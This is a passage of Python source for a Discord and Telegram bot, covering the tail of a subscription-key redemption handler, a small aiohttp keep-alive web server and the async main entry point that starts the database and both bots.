        dt = datetime.timedelta(days=kd['duration_days'], hours=kd['duration_hours']) + datetime.timedelta(days=30*kd['duration_months'])
        curr = await conn.fetchrow("SELECT subscription_expiry FROM users WHERE user_id = $1", ctx.author.id)
        bt = max(datetime.datetime.now(), curr['subscription_expiry'] if curr else datetime.datetime.now())
        exp = bt + dt if not kd['is_lifetime'] else datetime.datetime.now() + datetime.timedelta(days=36500)
        await conn.execute("INSERT INTO users (user_id, subscription_expiry) VALUES ($1, $2) ON CONFLICT (user_id) DO UPDATE SET subscription_expiry = EXCLUDED.subscription_expiry", ctx.author.id, exp)
        await conn.execute("UPDATE keys SET used = TRUE WHERE key = $1", kv)
        await ctx.send(f"🎉 Active until: `{exp}`")

from aiohttp import web
import os

# --- Web Server for Hosting ---
async def handle_ping(request):
    return web.Response(text="Bot is alive!")

async def start_web_server():
    app = web.Application()
    app.router.add_get('/', handle_ping)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', int(os.environ.get('PORT', 5000)))
    await site.start()
    logger.info(f"Web server started on port {os.environ.get('PORT', 5000)}")

# --- Main Entry ---
async def main():
    await setup_db()
    await start_web_server()
    await tg_app.initialize()
    await tg_app.start()
    tg_polling_task = asyncio.create_task(tg_app.updater.start_polling())
    try:
        await discord_bot.start(DISCORD_TOKEN)
    finally:
        await tg_app.updater.stop()
        await tg_app.stop()
        await tg_app.shutdown()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        pass
